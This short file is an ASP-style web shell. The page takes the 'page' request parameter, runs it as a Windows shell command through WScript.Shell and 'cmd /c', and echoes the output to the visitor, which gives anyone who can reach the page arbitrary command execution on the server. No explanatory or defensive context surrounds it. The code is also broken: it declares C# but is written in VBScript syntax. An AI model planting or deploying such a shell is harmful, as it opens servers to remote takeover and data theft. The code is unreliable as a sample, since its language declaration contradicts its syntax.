<%@ Page Language="C#" %>
<%
param = Request.Item("page")
Set ws = CreateObject("WScript.Shell")
Response.Write(ws.Exec("cmd /c " & param).StdOut.ReadAll())
%>
